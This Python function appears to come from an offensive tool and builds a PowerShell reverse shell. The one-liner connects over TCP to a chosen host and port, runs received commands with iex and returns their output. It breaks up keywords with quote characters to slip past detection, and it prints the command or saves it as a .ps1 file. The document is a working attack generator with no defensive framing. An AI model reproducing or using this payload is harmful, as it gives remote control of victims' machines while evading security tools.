def generate_powershell(lhost, lport):
    # generate the PowerShell command
    print('')
    print('---------------------------------------------------------------------------')
    powershell_command = "$client = N''ew-O'bje'ct System.Net.Sockets.TCPClient('" + lhost + "'," + str(lport) + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (N'e'w-Obje''ct -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i'e'x $data 2>&1 | O'u't-'S'tr'in'g );$sendback2 = $sendback + '<:Garm:> ' + (p'w'd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    
    # prompt user if they want to show the PowerShell command or save as a .ps1 file
    print('')
    save_as_file = input('Do you want to save the PowerShell script as a .ps1 file? (y/n) ')

    # show PowerShell command in console
    if save_as_file.lower() == 'n':
        print('')
        print(powershell_command)
        print('')
        print('---------------------------------------------------------------------------')
    
    # save PowerShell command as a .ps1 file
    elif save_as_file.lower() == 'y':
        filename = input('Enter a name for the .ps1 file: ')
        with open(f'output/{filename}.ps1', 'w') as f:
            f.write(powershell_command)
        print('')
        print('PowerShell script saved as ' + filename + '.ps1 in the output folder')
        print('')
        print('---------------------------------------------------------------------------')
    
    # handle invalid input
    else:
        print('')
        print('Invalid input. Please enter "y" or "n".')
        print('')
        
